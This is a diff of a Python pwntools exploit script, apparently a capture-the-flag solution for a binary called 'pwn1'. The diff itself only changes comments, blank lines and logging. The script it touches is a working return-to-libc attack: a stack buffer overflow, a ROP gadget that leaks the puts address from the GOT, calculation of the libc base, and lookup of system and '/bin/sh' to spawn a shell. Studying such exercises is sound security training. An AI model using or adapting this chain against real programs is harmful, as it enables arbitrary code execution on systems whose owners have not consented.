@@ -1,6 +1,4 @@
 #!/usr/bin/python
-#coding=utf-8
-#__author__:TaQini
 
 from pwn import *
 
@@ -13,13 +11,18 @@ context.binary = './pwn1'
 context.arch = ELF(local_file).arch
 elf=ELF(local_file)
 libc=ELF(local_libc)
+
+
 put_got= p64(0x0000000000602018)
 put_plt= p64(0x0000000000400550)
 main = 0x0000000000400698
 rdi_gadget= p64(0x0000000000400783)
 #+ put_got + put_plt +main
+
+#ROP1
 payload=cyclic(72)
 payload += rdi_gadget + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(main)
+log.info("ROP1")
 log.info("Payloading...")
 p.recvuntil('buffer:')
 p.sendline(payload)
@@ -30,8 +33,8 @@ puts= u64(leaked.ljust(8,"\x00"))
 log.info("Leaked: "+hex(puts))
 libc_base=puts-libc.sym["puts"]
 log.info("libc_base: "+hex(libc_base))
-log.info(hex(libc.search("/bin/sh").next()))
-log.info("system: "+hex(libc.sym["system"]))
+#log.info(hex(libc.search("/bin/sh").next()))
+#log.info("system: "+hex(libc.sym["system"]))
 sh=libc_base+libc.search("/bin/sh").next()
 system=libc_base+libc.sym["system"]
 log.info("ROP2...")
